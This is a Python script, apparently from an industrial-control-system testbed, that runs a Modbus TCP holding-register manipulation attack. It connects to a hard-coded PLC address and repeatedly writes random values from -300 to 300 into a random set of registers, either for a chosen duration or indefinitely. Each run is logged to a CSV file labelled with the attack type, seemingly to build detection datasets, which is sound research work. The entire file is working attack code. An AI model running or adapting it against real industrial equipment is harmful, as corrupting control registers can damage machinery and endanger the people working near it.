import time
import struct
import random
import argparse
import csv
import os
from datetime import datetime
from pymodbus.client import ModbusTcpClient
from colorama import Fore, Style
from utils import read_memory, write_memory, get_enabled_coils, random_float_dict

parser = argparse.ArgumentParser(
    description="Holding Register Manipulator - Writes random values to random Modbus holding registers",
    usage="python3 hr_manipulator.py --duration <DURATION>"
)

parser.add_argument("--duration", help="Duration of the attack (0 = infinite)", type=int, required=False, default=0)

args = parser.parse_args()

# Connect to Modbus device
try:
    client = ModbusTcpClient(host="192.168.60.4", port=502)
    connection_status = client.connect()
    print(Fore.GREEN + "Connection successfully established" + Style.RESET_ALL)
except Exception as e:
    print(Fore.RED + "The IP address or the port is incorrect. Please check the configurations." + Style.RESET_ALL)
    exit(1)

# --- LOGGING SETUP ---
LOG_FILE = "log_hrm_slitting_notching.csv"

# Define the CSV headers
csv_headers = [
    "id",
    "attack_type",
    "start_time",
    "end_time",
    "duration_seconds",
    "max_holding_registers",
    "n_registers_manipulated",
    "register_addresses_list",
    "register_values",
    "value_range_min",
    "value_range_max",
    "target_host"
]

# Record start time (human-readable and epoch)
start_time = time.time()
start_time_str = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

max_coils = 23
n_hr = random.randint(1, max_coils)

total_hr_to_manipulate = [i for i in range(2048, 2048+2*max_coils, 2)]
random_dict = random_float_dict(total_hr_to_manipulate, n_hr, min_val=-300.0, max_val=300.0)

# Sort for cleaner logging
manipulated_registers = sorted(random_dict.keys())

print(f"Attack running... Manipulating {n_hr} holding registers. Press Ctrl+C to stop manually.")
print(f"Register addresses: {manipulated_registers}")

# Set up duration
if args.duration > 0:
    end_time = start_time + args.duration
    infinite = False
else:
    infinite = True
    end_time = float('inf')

attack_ended_by = "duration"

try:
    while time.time() < end_time:
        now = time.time()
        for hr, value in random_dict.items():
            write_memory(client, hr, value)

except KeyboardInterrupt:
    print(Fore.CYAN + "\nAttack interrupted by user." + Style.RESET_ALL)
    attack_ended_by = "keyboard_interrupt"
finally:
    # Record end time
    end_time_actual = time.time()
    end_time_str = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    actual_duration = end_time_actual - start_time
    
    client.close()
    print(Fore.GREEN + "Connection closed." + Style.RESET_ALL)
    
    # --- LOGGING TO CSV ---
    # Generate a unique ID based on timestamp
    attack_id = datetime.now().strftime("%Y%m%d_%H%M%S") + f"_{random.randint(1000, 9999)}"
    
    # Convert register values to string representation for logging
    register_values_dict = {str(addr): f"{value:.4f}" for addr, value in random_dict.items()}
    
    # Prepare the row data
    log_row = {
        "id": attack_id,
        "attack_type": "holding_register_manipulation",
        "start_time": start_time_str,
        "end_time": end_time_str,
        "duration_seconds": f"{actual_duration:.2f}",
        "max_holding_registers": max_coils,
        "n_registers_manipulated": n_hr,
        "register_addresses_list": str(manipulated_registers),
        "register_values": str(register_values_dict),
        "value_range_min": -300.0,
        "value_range_max": 300.0,
        "target_host": "192.168.60.4:502"
    }
    
    # Check if file exists to determine if we need to write headers
    file_exists = os.path.isfile(LOG_FILE)
    
    try:
        with open(LOG_FILE, mode='a', newline='') as csv_file:
            writer = csv.DictWriter(csv_file, fieldnames=csv_headers)
            
            # Write header only if file is new
            if not file_exists:
                writer.writeheader()
            
            # Write the attack record
            writer.writerow(log_row)
        
        print(Fore.CYAN + f"Attack logged to {LOG_FILE} (ID: {attack_id})" + Style.RESET_ALL)
    
    except Exception as e:
        print(Fore.RED + f"Error writing to log file: {e}" + Style.RESET_ALL)